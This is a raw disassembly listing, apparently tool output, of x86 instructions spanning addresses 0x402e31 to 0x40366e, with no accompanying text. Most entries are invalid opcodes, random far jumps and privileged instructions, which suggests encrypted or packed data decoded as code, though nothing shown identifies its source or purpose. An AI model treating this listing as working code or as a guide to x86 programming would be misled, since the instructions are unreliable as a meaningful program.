  402e31:	fdivr  st(3),st
  402e33:	fdivp  st(7),st
  402e35:	fcomp  st(0)
  402e37:	or     cl,bh
  402e39:	push   cs
  402e3a:	jmp    0x402e40
  402e3c:	fisubr DWORD PTR [edx-0x170e3914]
  402e42:	in     al,0xb1
  402e44:	out    dx,al
  402e45:	into   
  402e46:	mov    cl,0xf3
  402e48:	xlat   BYTE PTR ds:[ebx]
  402e49:	mov    edx,0xd4dbd8cd
  402e4e:	cli    
  402e4f:	out    dx,al
  402e50:	div    esp
  402e52:	in     al,dx
  402e53:	add    dl,bh
  402e55:	pop    es
  402e56:	or     DWORD PTR [eax],eax
  402e58:	add    eax,ebp
  402e5a:	pop    es
  402e5b:	push   es
  402e5c:	in     al,dx
  402e5d:	mov    dl,0xd8
  402e5f:	call   0xec250337
  402e64:	mov    edx,0xcafeb2ef
  402e69:	in     al,dx
  402e6a:	imul   esi
  402e6c:	hlt    
  402e6d:	add    edx,esp
  402e6f:	mov    ch,0xf4
  402e71:	icebp  
  402e72:	loop   0x402e36
  402e74:	add    bl,al
  402e76:	out    0xc0,al
  402e78:	or     edx,ebp
  402e7a:	jmp    0xbdc5:0xa9c1130e
  402e81:	icebp  
  402e82:	(bad)  
  402e83:	mov    cl,0xf7
  402e85:	jmp    0x402e51
  402e87:	mov    cl,0xfd
  402e89:	leave  
  402e8a:	mov    esi,0xeed4f2cf
  402e8f:	fcmovnb st,st(7)
  402e91:	in     eax,0xf3
  402e93:	aam    0xf5
  402e95:	jmp    0x402e76
  402e97:	add    cl,BYTE PTR [eax]
  402e99:	(bad)  
  402e9b:	in     al,0xc
  402e9d:	lods   eax,DWORD PTR ds:[esi]
  402e9e:	in     al,0xc1
  402ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ea1:	lods   al,BYTE PTR ds:[esi]
  402ea2:	call   0xc9392197
  402ea7:	jmp    0xdaf61a90
  402eac:	hlt    
  402ead:	into   
  402eae:	mov    esp,0xc0dbdcb5
  402eb3:	(bad)  
  402eb5:	std    
  402eb6:	(bad)  
  402eb7:	(bad)  
  402eb8:	add    esi,ecx
  402eba:	(bad)  
  402ebc:	fucomip st,st(3)
  402ebe:	ffreep st(6)
  402ec0:	in     eax,dx
  402ec1:	scas   eax,DWORD PTR es:[edi]
  402ec2:	test   edx,0xd0c4f5f9
  402ec8:	mov    dh,0xbf
  402eca:	aam    0xfb
  402ecc:	add    esp,ebp
  402ece:	(bad)  
  402ed0:	idiv   dl
  402ed2:	(bad)  
  402ed3:	jmp    0x402ed4
  402ed5:	call   0xe74c18b0
  402eda:	repz sti 
  402edc:	fsub   st,st(7)
  402ede:	into   
  402edf:	shl    bl,0xd6
  402ee2:	rol    ch,1
  402ee4:	sar    edx,0xb5
  402ee7:	fidivr DWORD PTR [esi+0x1d0f1f1]
  402eed:	cld    
  402eee:	rcl    edx,1
  402ef0:	into   
  402ef1:	xlat   BYTE PTR ds:[ebx]
  402ef2:	(bad)  
  402ef3:	(bad)  
  402ef4:	hlt    
  402ef5:	add    al,0xcb
  402ef7:	fst    st(5)
  402ef9:	jecxz  0x402ef7
  402efb:	add    bh,cl
  402efd:	mov    dl,0xe9
  402eff:	loop   0x402ef3
  402f01:	mov    dl,0xc6
  402f03:	into   
  402f04:	out    0xb6,eax
  402f06:	(bad)  
  402f07:	out    dx,al
  402f08:	std    
  402f09:	div    ebp
  402f0b:	add    dh,dl
  402f0d:	hlt    
  402f0e:	ret    0xd2f4
  402f11:	lds    eax,FWORD PTR [esi]
  402f13:	jmp    0xdbde:0xdadef5d6
  402f1a:	lds    edx,FWORD PTR [ebx]
  402f1c:	leave  
  402f1d:	mov    esi,0xccc6caec
  402f22:	lods   eax,DWORD PTR ds:[esi]
  402f23:	in     al,dx
  402f24:	shl    edi,cl
  402f26:	(bad)  
  402f27:	jmp    0x402ee3
  402f29:	call   0xf41ee100
  402f2e:	in     al,dx
  402f2f:	(bad)  
  402f31:	ret    
  402f32:	fcomp  st(7)
  402f34:	ret    
  402f35:	add    esi,esi
  402f37:	(bad)  ds:0xd20bc606
  402f3d:	loope  0x402ee8
  402f3f:	ror    esi,cl
  402f41:	out    dx,al
  402f42:	out    dx,al
  402f43:	repnz leave 
  402f45:	int    0xed
  402f47:	ror    ebx,cl
  402f49:	mov    edx,0xbcf6f2d9
  402f4e:	lock mov esp,0xe7cc07d0
  402f54:	add    ch,bh
  402f56:	or     esp,eax
  402f58:	in     eax,dx
  402f59:	loop   0x402f24
  402f5b:	loop   0x402f5c
  402f5d:	scas   eax,DWORD PTR es:[edi]
  402f5e:	lods   eax,DWORD PTR ds:[esi]
  402f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f60:	(bad)  
  402f62:	(bad)  
  402f63:	int    0xf1
  402f65:	in     al,0xd1
  402f67:	out    0xd6,al
  402f69:	rcl    esp,cl
  402f6b:	in     al,dx
  402f6c:	mov    eax,0xf6fbf9b7
  402f71:	(bad)  
  402f72:	idiv   ecx
  402f74:	test   DWORD PTR [edi],0xc605e2e2
  402f7a:	call   0xbff93f79
  402f7f:	int3   
  402f80:	retf   
  402f81:	lock jmp 0xebb1:0xbbeceee7
  402f89:	mov    ebx,0xfad0d2ce
  402f8e:	enter  0xdbf9,0xf4
  402f92:	hlt    
  402f93:	repnz rol BYTE PTR [edx],1
  402f96:	fadd   st(4),st
  402f98:	(bad)  
  402f99:	out    dx,al
  402f9a:	retf   0x7f9
  402f9d:	stos   BYTE PTR es:[edi],al
  402f9e:	mov    bl,0xe2
  402fa0:	repnz sar ebx,cl
  402fa3:	call   0xf0f3095d
  402fa8:	icebp  
  402fa9:	fdiv   QWORD PTR [esi-0x27fd3646]
  402faf:	rcl    esp,0x1
  402fb2:	in     eax,0xd8
  402fb4:	pop    es
  402fb5:	test   dh,0xe6
  402fb8:	add    bh,dl
  402fba:	iret   
  402fbb:	or     BYTE PTR [ebx],dl
  402fbd:	leave  
  402fbe:	out    0xf7,al
  402fc0:	shl    edi,cl
  402fc2:	scas   al,BYTE PTR es:[edi]
  402fc3:	cli    
  402fc4:	out    0xc6,eax
  402fc6:	fcom   st(1)
  402fc8:	iret   
  402fc9:	enter  0xcfdd,0xfa
  402fcd:	rcr    ebx,0xe0
  402fd0:	loopne 0x402f9f
  402fd2:	std    
  402fd3:	add    eax,ecx
  402fd5:	add    eax,0xdadcf4d9
  402fda:	xabort 0x5
  402fdd:	enter  0xe5ef,0xe0
  402fe1:	in     eax,0xc6
  402fe3:	mov    ebx,0xc6eac7cc
  402fe8:	into   
  402fe9:	mov    dh,0xd0
  402feb:	sar    ebx,1
  402fed:	icebp  
  402fee:	add    edx,edi
  402ff0:	aam    0xfd
  402ff2:	out    0xbc,al
  402ff4:	or     esp,esi
  402ff6:	lock out dx,al
  402ff8:	in     eax,dx
  402ff9:	in     al,dx
  402ffa:	push   cs
  402ffb:	adc    ah,cl
  402ffd:	(bad)  
  402ffe:	mov    al,0xe6
  403000:	aad    0xf7
  403002:	imul   dh
  403004:	mov    ebx,0xdbd8c7f1
  403009:	in     al,dx
  40300a:	ror    bl,1
  40300c:	cld    
  40300d:	cld    
  40300e:	cmc    
  40300f:	mov    ebp,0x2dad9cc
  403014:	add    DWORD PTR [edx],eax
  403016:	(bad)  
  403018:	add    edx,ecx
  40301a:	or     ebp,ebx
  40301c:	adc    ch,BYTE PTR [esi-0x2b1e5219]
  403022:	(bad)  
  403023:	(bad)  
  403024:	retf   
  403025:	mov    edx,0xb3d7f8e8
  40302a:	mov    esi,0xfaffd9cd
  40302f:	mov    eax,0xdabebcfe
  403034:	(bad)  
  403035:	sti    
  403036:	(bad)  
  403037:	out    dx,al
  403038:	dec    dh
  40303a:	push   es
  40303b:	or     eax,0xe9cde7ec
  403040:	cmc    
  403041:	loop   0x403039
  403043:	shr    DWORD PTR [ecx+edi*8-0xb041308],cl
  40304a:	mov    ecx,0xe800d4fa
  40304f:	fcom   st(4)
  403051:	add    al,ah
  403053:	(bad)
  403056:	mov    ah,0xea
  403059:	hlt    
  40305a:	in     eax,0xe2
  40305c:	repnz into 
  40305e:	in     eax,0xcb
  403060:	shr    edi,cl
  403062:	shl    al,0xfb
  403065:	test   ecx,0xece4dbb0
  40306b:	ror    edi,1
  40306d:	out    dx,al
  40306e:	idiv   ebp
  403070:	ret    0xd6f1
  403073:	jmp    0xf8e5:0xf5020af7
  40307a:	pavgb  mm3,mm4
  40307d:	repnz repnz repnz mov bh,0xe5
  403082:	lods   eax,DWORD PTR ds:[esi]
  403083:	icebp  
  403084:	idiv   dl
  403086:	(bad)  [esi-0x82d404c]
  40308c:	aam    0xf6
  40308e:	rol    ebx,cl
  403090:	in     eax,0xc6
  403092:	shl    ah,cl
  403094:	clc    
  403095:	aad    0xe8
  403097:	test   bl,0xe5
  40309a:	jecxz  0x40307a
  40309c:	les    esi,FWORD PTR [ebx-0x18525034]
  4030a2:	scas   al,BYTE PTR es:[edi]
  4030a3:	mov    al,0xf1
  4030a5:	repz out 0xbf,eax
  4030a8:	push   DWORD PTR [ebx-0x1246302c]
  4030ae:	fcmovnu st,st(1)
  4030b0:	out    0xcc,al
  4030b2:	cli    
  4030b3:	add    bl,cl
  4030b5:	fcmovu st,st(5)
  4030b7:	add    eax,esi
  4030b9:	enter  0xeae8,0x7
  4030bd:	in     eax,dx
  4030be:	jecxz  0x403069
  4030c0:	enter  0xe6dc,0xb1
  4030c4:	mov    bl,0xc6
  4030c6:	repnz lods eax,DWORD PTR ds:[esi]
  4030c8:	out    dx,al
  4030c9:	in     eax,dx
  4030ca:	mov    ch,0xb4
  4030cc:	fstp   st(3)
  4030ce:	stc    
  4030cf:	cmc    
  4030d0:	add    dl,ah
  4030d2:	add    al,0xc6
  4030d4:	test   ebx,0xd807e2dd
  4030da:	cld    
  4030db:	in     al,dx
  4030dc:	(bad)  
  4030de:	(bad)  
  4030e0:	lods   al,BYTE PTR ds:[esi]
  4030e1:	call   0xd2f4dab2
  4030e6:	mov    dl,0xd2
  4030e8:	clc    
  4030e9:	mov    edi,0xc9b0b9ff
  4030ee:	add    dl,bl
  4030f0:	mov    edi,0x9f4d7d7
  4030f5:	cmc    
  4030f6:	loopne 0x403103
  4030f8:	or     ecx,DWORD PTR ds:0xb8ccf9dd
  4030fe:	mov    esp,0xd1ebd7af
  403103:	(bad)  
  403104:	int    0xcd
  403106:	aam    0xf4
  403108:	aam    0xbb
  40310a:	dec    bh
  40310c:	aad    0xfb
  40310e:	mov    esp,0xc6c3c7f0
  403113:	loopne 0x4030f2
  403115:	push   es
  403116:	out    dx,eax
  403117:	pmaddwd mm1,QWORD PTR [edi]
  40311a:	or     cl,al
  40311c:	call   0xc9f0f6e5
  403121:	in     al,0xdc
  403123:	(bad)  
  403125:	(bad)  
  403126:	aam    0xb7
  403128:	(bad)  
  40312a:	(bad)  
  40312b:	(bad)  
  40312d:	xlat   BYTE PTR ds:[ebx]
  40312e:	mov    edi,0xc6e2ced8
  403133:	cli    
  403134:	ret    0xd7ca
  403137:	rcr    edx,0xe4
  40313a:	in     eax,dx
  40313b:	jmp    0x403101
  40313d:	(bad)  
  40313e:	test   al,0xae
  403140:	in     al,dx
  403141:	out    dx,eax
  403142:	int    0xf4
  403144:	test   al,0xf1
  403146:	scas   al,BYTE PTR es:[edi]
  403147:	in     al,0xe8
  403149:	aad    0xb9
  40314b:	aam    0xf5
  40314d:	rcr    edi,1
  40314f:	sti    
  403150:	lock add bh,BYTE PTR [esi-0x163b05fa]
  403157:	push   es
  403158:	out    dx,eax
  403159:	retf   0xcdf9
  40315c:	(bad)  
  40315e:	mov    bl,0xf2
  403160:	mov    al,0xf3
  403162:	int    0xe5
  403164:	shl    DWORD PTR [ebp-0x4a09481b],0xd2
  40316b:	add    dl,bl
  40316d:	ffree  st(3)
  40316f:	(bad)  
  403170:	clc    
  403171:	out    0xc1,eax
  403173:	fimul  WORD PTR [ecx]
  403175:	(bad)  
  403177:	ffreep st(6)
  403179:	cld    
  40317a:	int3   
  40317b:	jmp    0xaee9:0xd1c0c8d8
  403182:	lods   al,BYTE PTR ds:[esi]
  403183:	mov    ch,0xcd
  403185:	in     eax,dx
  403186:	mov    ebx,0xcefbc9d2
  40318b:	in     eax,dx
  40318c:	into   
  40318d:	mov    ecx,0xf7e3c0c0
  403192:	(bad)  
  403193:	sti    
  403194:	cmc    
  403195:	or     al,bh
  403197:	fldpi  
  403199:	out    0xea,eax
  40319b:	push   es
  40319c:	out    0xed,al
  40319e:	mov    esp,0xd4b0c1d7
  4031a3:	into   
  4031a4:	mov    ch,0xe5
  4031a6:	cli    
  4031a7:	lods   eax,DWORD PTR ds:[esi]
  4031a8:	icebp  
  4031a9:	enter  0xe9d5,0xfa
  4031ad:	lock int 0xcd
  4031b0:	(bad)  
  4031b1:	mov    BYTE PTR [edi],0xfa
  4031b4:	fdivr  st,st(3)
  4031b6:	(bad)  
  4031b8:	into   
  4031b9:	inc    BYTE PTR [esi]
  4031bb:	add    esi,ebx
  4031bd:	into   
  4031be:	faddp  st(1),st
  4031c0:	out    0xce,eax
  4031c2:	ror    esi,1
  4031c4:	(bad)
  4031c8:	neg    ebx
  4031ca:	jmp    0x4031ca
  4031cc:	ret    0xf1dc
  4031cf:	icebp  
  4031d0:	fdivrp st(2),st
  4031d2:	loope  0x4031a5
  4031d4:	mov    eax,0xede2ffc6
  4031d9:	fmul   st,st(0)
  4031db:	pop    es
  4031dc:	in     eax,dx
  4031dd:	loope  0x4031ad
  4031df:	retf   
  4031e0:	rcl    ebp,0xf2
  4031e3:	lods   eax,DWORD PTR ds:[esi]
  4031e4:	(bad)
  4031e7:	(bad)  
  4031e8:	iret   
  4031e9:	jmp    0x4031dc
  4031eb:	retf   0xcfbc
  4031ee:	aad    0xfd
  4031f0:	out    0xe1,al
  4031f2:	add    dh,bh
  4031f4:	hlt    
  4031f5:	retf   0xbde5
  4031f8:	leave  
  4031f9:	cld    
  4031fa:	fadd   DWORD PTR [edx]
  4031fc:	rcr    dh,cl
  4031fe:	jecxz  0x4031ac
  403200:	jecxz  0x4031e2
  403202:	aam    0xfb
  403204:	loop   0x4031e1
  403206:	mov    dh,0xc8
  403208:	fsubr  st,st(0)
  40320a:	jmp    0xd7f5:0xe8f6cafa
  403211:	add    eax,0xbf03c6e5
  403216:	xlat   BYTE PTR ds:[ebx]
  403217:	loopne 0x403206
  403219:	or     eax,0xa90b0601
  40321e:	(bad)  
  40321f:	mov    ebp,0xd0d6ceb7
  403224:	loopne 0x4031f7
  403226:	mov    ecx,0xefedc6f4
  40322b:	fstp   st(5)
  40322d:	icebp  
  40322e:	add    DWORD PTR [eax-0xb25061e],edi
  403234:	fsubr  st(4),st
  403236:	add    eax,DWORD PTR [ecx]
  403238:	fisttp WORD PTR [esi]
  40323a:	aam    0xfb
  40323c:	in     eax,0xee
  40323e:	repz enter 0xc9ea,0xe9
  403243:	xlat   BYTE PTR ds:[ebx]
  403244:	sti    
  403245:	into   
  403246:	jmp    0x40320d
  403248:	repnz lock jmp 0xbcc1:0xf6d5d1b1
  403251:	int    0xc5
  403253:	sti    
  403254:	add    bl,dl
  403256:	loopne 0x40323a
  403258:	std    
  403259:	(bad)  
  40325b:	iret   
  40325c:	in     al,dx
  40325d:	ret    
  40325e:	lods   eax,DWORD PTR ds:[esi]
  40325f:	(bad)  
  403260:	loopne 0x403232
  403262:	jmp    0x403253
  403264:	loope  0x40323f
  403266:	icebp  
  403267:	leave  
  403268:	in     eax,0xd9
  40326a:	mov    ebx,0xe803fcbd
  40326f:	cld    
  403270:	mov    esp,0xcbf9f6
  403275:	jecxz  0x403277
  403277:	mov    ebp,0x4cfdcc4
  40327c:	leave  
  40327d:	rcl    bh,1
  40327f:	mov    cl,0xe6
  403281:	jmp    0xd90de466
  403286:	mov    cl,0xff
  403288:	mov    ah,0xdd
  40328a:	rcr    ch,1
  40328c:	into   
  40328d:	aad    0xd6
  40328f:	out    dx,eax
  403290:	repz rol cl,cl
  403293:	repz cli 
  403295:	out    0xf4,eax
  403297:	enter  0x6df,0xcd
  40329b:	retf   0xb10c
  40329e:	sar    DWORD PTR [ebp+eax*8-0x281d3833],cl
  4032a5:	mov    ch,0xd8
  4032a7:	(bad)  
  4032a8:	cli    
  4032a9:	xlat   BYTE PTR ds:[ebx]
  4032aa:	in     al,0xdf
  4032ac:	stc    
  4032ad:	mov    eax,0xbff1e2ec
  4032b2:	int3   
  4032b3:	add    eax,edi
  4032b5:	fld    QWORD PTR [ebx]
  4032b7:	add    al,0x5
  4032b9:	vmovlps xmm1,xmm3,QWORD PTR ds:0xe2c3f2e5
  4032c1:	loopne 0x4032b2
  4032c3:	iret   
  4032c4:	(bad)  
  4032c6:	(bad)  
  4032c7:	call   0xbb181bc0
  4032cc:	fucomp st(5)
  4032ce:	icebp  
  4032cf:	mov    esi,0xd9c7faff
  4032d4:	add    al,0xd6
  4032d6:	fild   WORD PTR [edx]
  4032d8:	(bad)  
  4032d9:	or     ebp,edi
  4032db:	leave  
  4032dc:	out    0xee,eax
  4032de:	test   al,0xe4
  4032e0:	jmp    0xcbd9:0xfbcbd2e9
  4032e7:	out    dx,al
  4032e8:	aad    0xfb
  4032ea:	mov    esi,0xdad6f2f3
  4032ef:	iret   
  4032f0:	(bad)  
  4032f1:	dec    DWORD PTR [ebx]
  4032f3:	rcr    ebx,0x6
  4032f6:	mov    BYTE PTR [edi],0xc4
  4032f9:	jmp    0x403306
  4032fb:	or     ah,bh
  4032fd:	mov    cl,0xf0
  4032ff:	call   0xed1722c6
  403304:	idiv   DWORD PTR [edx-0x4421004a]
  40330a:	mov    edi,0xf3b9f9cb
  40330f:	stc    
  403310:	ret    0xebbb
  403313:	stc    
  403314:	clc    
  403315:	fxtract 
  403317:	(bad)  
  403318:	fisttp DWORD PTR ds:0xcf09ff0e
  40331e:	lods   al,BYTE PTR ds:[esi]
  40331f:	ret    
  403320:	out    0xc3,eax
  403322:	jmp    0x40331b
  403324:	rcl    dl,1
  403326:	clc    
  403327:	in     al,0xca
  403329:	fucomip st,st(7)
  40332b:	mov    ebx,0xbcf0e0de
  403330:	cli    
  403331:	ror    BYTE PTR [ebx],cl
  403333:	in     eax,0x0
  403335:	or     al,cl
  403337:	add    esi,esp
  403339:	in     al,0xf9
  40333b:	push   cs
  40333c:	fsubr  st(5),st
  40333e:	in     eax,0xf1
  403340:	in     al,dx
  403341:	mov    ch,0xcd
  403343:	rcl    bl,cl
  403345:	sti    
  403346:	rcr    ebx,cl
  403348:	into   
  403349:	mov    ebx,0xcfdbe2db
  40334e:	rcr    ebp,cl
  403350:	cmc    
  403351:	out    0xc3,al
  403353:	(bad)  
  403355:	or     DWORD PTR [edi],ecx
  403357:	or     ebp,eax
  403359:	in     eax,0xd9
  40335b:	call   edx
  40335d:	faddp  st(2),st
  40335f:	int    0xd0
  403361:	mov    dh,0xe9
  403363:	mov    ah,0xda
  403365:	rcl    edx,1
  403367:	retf   
  403368:	into   
  403369:	mov    edi,0xd4eefeb9
  40336e:	rcl    ebp,0xe1
  403371:	loopne 0x403352
  403373:	(bad)  
  403374:	or     edx,ebp
  403376:	loopne 0x403359
  403378:	cli    
  403379:	jecxz  0x403379
  40337b:	shr    ebp,0xbc
  40337e:	mov    ebp,0xf7ddaec8
  403383:	in     al,dx
  403384:	test   al,0xbb
  403387:	fcomp  st(7)
  403389:	(bad)  
  40338b:	repnz mul cl
  40338e:	out    dx,al
  40338f:	not    eax
  403391:	lock jmp 0x403391
  403394:	cld    
  403395:	push   es
  403396:	add    bl,ah
  403398:	into   
  403399:	add    esi,ebx
  40339b:	repnz fsubp st(6),st
  40339e:	repnz mov bh,0xf7
  4033a1:	cmc    
  4033a2:	mov    ah,0xbb
  4033a4:	(bad)  
  4033a5:	fcom   st(2)
  4033a7:	mov    ebx,0xd7e9f4ee
  4033ac:	in     eax,dx
  4033ad:	mov    ebx,0xbc02c0dd
  4033b2:	mov    esi,0xd5e2c205
  4033b7:	(bad)  
  4033b9:	in     al,dx
  4033ba:	into   
  4033bb:	or     al,0xf3
  4033bd:	fnstcw WORD PTR [ecx+ebp*4-0x524c3222]
  4033c4:	out    dx,eax
  4033c5:	(bad)
  4033c8:	jmp    0x403395
  4033ca:	repnz retf 
  4033cc:	mov    ebx,0xb8d8f2bf
  4033d1:	stc    
  4033d2:	mov    edx,0xc5f4e4e2
  4033d7:	loope  0x4033b8
  4033d9:	pop    es
  4033da:	std    
  4033db:	(bad)  
  4033dc:	loop   0x4033a0
  4033de:	retf   0xddc0
  4033e1:	mov    dh,0xee
  4033e3:	aam    0xf4
  4033e5:	(bad)  
  4033e6:	lock idiv DWORD PTR [esi-0x2a292206]
  4033ed:	mov    ebx,0xd0d7e1f8
  4033f2:	shl    ebx,0x9
  4033f5:	(bad)  
  4033f7:	or     esp,edi
  4033f9:	jmp    0x4033c3
  4033fb:	cli    
  4033fc:	add    dl,ch
  4033fe:	loope  0x4033f3
  403400:	ror    bh,0xc2
  403403:	(bad)  
  403404:	mov    cl,0xed
  403406:	loopne 0x4033f3
  403408:	rcl    ch,cl
  40340a:	mov    dl,0xf2
  40340c:	test   dh,0xd3
  40340f:	shl    dl,cl
  403411:	stc    
  403412:	in     al,0xe4
  403414:	aad    0x8
  403416:	in     al,0xa
  403418:	out    dx,al
  403419:	cld    
  40341a:	or     al,0xcb
  40341c:	(bad)  
  40341e:	iret   
  40341f:	loopne 0x403409
  403421:	mov    dl,0xc6
  403423:	in     eax,dx
  403424:	mov    bh,0xd0
  403426:	div    ebp
  403428:	int3   
  403429:	leave  
  40342a:	sar    DWORD PTR [eax-0x2805291f],1
  403430:	into   
  403431:	rcr    dh,cl
  403433:	(bad)  
  403434:	fdivr  st,st(3)
  403436:	sti    
  403437:	rol    BYTE PTR [ecx],0xe1
  40343a:	(bad)  
  40343b:	in     al,dx
  40343c:	(bad)  
  40343d:	mov    eax,0xf6a4efe6
  403442:	ret    
  403443:	leave  
  403444:	out    0xd7,eax
  403446:	out    dx,al
  403447:	cli    
  403448:	int3   
  403449:	call   0xf82afe31
  40344e:	in     al,dx
  40344f:	fdiv   st,st(0)
  403451:	shl    ch,1
  403453:	or     edi,edx
  403455:	shl    dh,1
  403457:	pmulhuw mm4,mm1
  40345a:	jmp    0x403441
  40345c:	out    0xcb,eax
  40345e:	retf   0xc8c7
  403461:	ret    
  403462:	jmp    0xd1b4:0xe7cdc8e2
  403469:	shl    DWORD PTR [eax+edi*4-0x91301ff],1
  403470:	cmc    
  403471:	hlt    
  403472:	repnz loop 0x403472
  403475:	stc    
  403476:	retf   
  403477:	sti    
  403478:	stc    
  403479:	aad    0x9
  40347b:	(bad)
  40347e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40347f:	iret   
  403480:	scas   al,BYTE PTR es:[edi]
  403481:	repnz out dx,eax
  403483:	int    0xac
  403485:	aad    0xd1
  403487:	jmp    0xdbfa297e
  40348c:	fcmovnbe st,st(0)
  40348e:	idiv   al
  403490:	out    0xf1,eax
  403492:	ret    0xbcfb
  403495:	rol    BYTE PTR ds:0xfd010bca,1
  40349b:	retf   0xc2f1
  40349e:	fmulp  st(3),st
  4034a0:	fmulp  st(2),st
  4034a2:	out    dx,al
  4034a3:	(bad)  
  4034a4:	ror    esi,1
  4034a6:	mov    ecx,0xbdf3f5f6
  4034ab:	(bad)  
  4034ad:	aad    0xfe
  4034af:	ret    
  4034b0:	std    
  4034b1:	fadd   st(2),st
  4034b3:	add    eax,0xe0c508dc
  4034b8:	jmp    0xe93f48a7
  4034bd:	shl    dl,0xd7
  4034c0:	loope  0x4034b5
  4034c2:	shl    DWORD PTR [edi-0xb380b19],cl
  4034c8:	(bad)  
  4034c9:	fdiv   st,st(6)
  4034cb:	shl    dl,cl
  4034cd:	mov    esp,0x4ecfdd4
  4034d2:	clc    
  4034d3:	sti    
  4034d4:	mov    eax,0xc604e5d1
  4034d9:	iret   
  4034da:	les    eax,FWORD PTR [edi]
  4034dc:	leave  
  4034dd:	(bad)  
  4034de:	lods   eax,DWORD PTR ds:[esi]
  4034df:	in     al,dx
  4034e0:	lods   eax,DWORD PTR ds:[esi]
  4034e1:	cmc    
  4034e2:	shl    dl,cl
  4034e4:	rcr    bl,0xae
  4034e7:	call   0xe3f5f2bc
  4034ec:	lock fdivr st(3),st
  4034ef:	(bad)  
  4034f1:	fild   WORD PTR [eax+eiz*8]
  4034f4:	xlat   BYTE PTR ds:[ebx]
  4034f5:	cmc    
  4034f6:	jmp    0x4034bd
  4034f8:	out    0x6,eax
  4034fa:	leave  
  4034fb:	adc    cl,BYTE PTR [esi]
  4034fd:	out    0xc6,al
  4034ff:	shr    edi,cl
  403501:	mov    cl,0xb0
  403503:	ret    
  403504:	jmp    0x4034d9
  403506:	out    dx,eax
  403507:	mov    ebx,0x2ebdcf4
  40350c:	int3   
  40350d:	enter  0xd5b9,0xf9
  403511:	jecxz  0x4034ff
  403513:	loopne 0x4034fa
  403515:	aad    0xea
  403517:	mov    ebp,0xe1ccfcef
  40351c:	into   
  40351d:	jmp    0xf1e1:0xb0e0dcbf
  403524:	loopne 0x4034eb
  403526:	repnz rcl edx,cl
  403529:	mov    bh,0xec
  40352b:	imul   eax
  40352d:	repnz sar ch,cl
  403530:	rcr    dl,1
  403532:	ret    0xd8eb
  403535:	loope  0x403510
  403537:	out    0xdd,al
  403539:	fdivp  st(5),st
  40353b:	or     eax,0xc9f7ceeb
  403540:	ret    0xaee5
  403543:	in     eax,0xc6
  403545:	fcomi  st,st(6)
  403547:	aam    0xda
  403549:	repnz in al,0xb5
  40354c:	in     eax,dx
  40354d:	(bad)  
  40354f:	add    BYTE PTR [edi],al
  403551:	ret    
  403552:	xlat   BYTE PTR ds:[ebx]
  403553:	mov    BYTE PTR [eax],0xeb
  403556:	loop   0x403558
  403558:	rcr    bl,0xe3
  40355b:	jmp    0xead0:0xc7e0e7f3
  403562:	into   
  403563:	in     eax,dx
  403564:	repz (bad) 
  403566:	out    0xf6,al
  403568:	mov    al,0xc8
  40356a:	(bad)
  40356e:	aad    0xfd
  403570:	xlat   BYTE PTR ds:[ebx]
  403571:	ret    0xdeba
  403574:	add    eax,0xede706e0
  403579:	out    dx,eax
  40357a:	stc    
  40357b:	add    eax,0xecafb105
  403580:	rcl    esi,1
  403582:	lods   al,BYTE PTR ds:[esi]
  403583:	mov    dl,0xf0
  403585:	mov    ecx,0xdff9b1b8
  40358a:	icebp  
  40358b:	stc    
  40358c:	lock call 0xe82e2c61
  403592:	fucom  st(7)
  403594:	loopne 0x40355b
  403596:	retf   0xfcc1
  403599:	in     al,dx
  40359a:	in     al,dx
  40359b:	sti    
  40359c:	push   cs
  40359d:	fsubp  st(4),st
  40359f:	ret    
  4035a0:	rol    ebp,cl
  4035a2:	lods   eax,DWORD PTR ds:[esi]
  4035a3:	shr    bl,1
  4035a5:	clc    
  4035a6:	sti    
  4035a7:	(bad)  
  4035a9:	faddp  st(4),st
  4035ab:	jecxz  0x40356c
  4035ad:	leave  
  4035ae:	in     eax,dx
  4035af:	loope  0x40357d
  4035b1:	out    0xbe,eax
  4035b3:	(bad)  
  4035b5:	sti    
  4035b6:	les    eax,FWORD PTR [esi]
  4035b8:	(bad)  
  4035ba:	into   
  4035bb:	fucomi st,st(3)
  4035bd:	into   
  4035be:	rcl    bl,1
  4035c0:	mov    bh,0xf5
  4035c2:	lock jmp 0x40359c
  4035c5:	(bad)  
  4035c6:	out    0xcb,al
  4035c8:	jmp    0x403592
  4035ca:	mov    ebx,0xc0bdfbd6
  4035cf:	fsubrp st(2),st
  4035d1:	out    0xe2,eax
  4035d3:	cld    
  4035d4:	(bad)  
  4035d5:	aad    0xd4
  4035d7:	fsub   st,st(4)
  4035d9:	or     eax,0xe013ea02
  4035de:	mov    edi,0xf0cec2f7
  4035e3:	out    0xda,eax
  4035e5:	aad    0xd8
  4035e7:	cmc    
  4035e8:	fcomp  st(2)
  4035ea:	mov    esi,0xeefaecf7
  4035ef:	fcmovne st,st(5)
  4035f1:	add    eax,0xc903e2d3
  4035f6:	(bad)  
  4035f7:	jmp    0xc2c9:0xc8e2eb0b
  4035fe:	mov    dl,0xc2
  403600:	jecxz  0x4035f0
  403602:	mov    ch,0xc5
  403604:	shr    ah,cl
  403606:	loopne 0x4035d9
  403608:	(bad)  
  403609:	aad    0xb2
  40360b:	aad    0xd6
  40360d:	mov    esp,0xe1dbfcdd
  403612:	(bad)  
  403615:	in     eax,0xc1
  403617:	enter  0xdcfe,0xa
  40361b:	or     al,0x13
  40361d:	repz rcl dl,1
  403620:	retf   0xd4ef
  403623:	out    dx,eax
  403624:	in     al,dx
  403625:	scas   eax,DWORD PTR es:[edi]
  403626:	int    0xd3
  403628:	std    
  403629:	mov    edi,0xd7efc3f6
  40362e:	sti    
  40362f:	std    
  403630:	ret    0xf7ec
  403633:	repz ret 0xe3c9
  403637:	fisttp QWORD PTR [ebx]
  403639:	fcmovb st,st(2)
  40363b:	add    eax,0xb3d3c5eb
  403640:	(bad)  
  403641:	ror    esp,0xc3
  403644:	(bad)  
  403645:	retf   
  403646:	mov    ah,0xd7
  403648:	mov    ebx,0xbdd0ccdc
  40364d:	rcr    bh,1
  40364f:	out    dx,al
  403650:	(bad)  
  403651:	icebp  
  403652:	add    al,dh
  403654:	in     al,0xc2
  403656:	or     DWORD PTR [eax],eax
  403658:	loopne 0x403657
  40365a:	(bad)  
  40365c:	or     edx,ebx
  40365e:	imul   edi
  403660:	leave  
  403661:	out    dx,al
  403662:	aad    0xe5
  403664:	mov    al,0xe8
  403666:	aad    0xea
  403668:	mov    al,0xec
  40366a:	in     al,0xef
  40366c:	cld    
  40366d:	out    dx,al
  40366e:	add    ah,ch
